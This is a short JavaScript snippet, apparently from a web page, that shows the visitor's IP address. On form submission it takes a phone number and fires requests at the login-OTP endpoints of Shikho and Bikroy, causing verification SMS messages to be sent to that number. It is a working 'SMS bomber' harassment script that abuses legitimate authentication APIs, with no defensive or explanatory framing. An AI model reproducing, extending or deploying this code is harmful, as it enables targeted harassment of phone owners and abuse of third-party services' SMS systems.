window.onload=async()=>{
try{const ipapi=await fetch('https://api.ipify.org?format=json');const data=await ipapi.json();ip.textContent=`IP: ${data.ip}`;}catch{ip.textContent='IP: Could not fetch IP !';}};
form.onsubmit = async x => {
x.preventDefault();
button.disabled = true;
const num = number.value.trim();
try{
await fetch('https://api.shikho.com/auth/v2/send/sms', {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({auth_type: 'login',phone: num,vendor: 'shikho',type: 'student'})}).then(r => console.log('Shikho call:', r.status)).catch(err => console.error('Shikho error:', err));
await new Promise(resolve => setTimeout(resolve, 2500));
await fetch('https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=' + encodeURIComponent(num)).then(r => console.log('Bikroy call:', r.status)).catch(err => console.error('Bikroy error:', err));
}catch(err){console.error('Error during submission:', err);
}finally{button.disabled = false;}};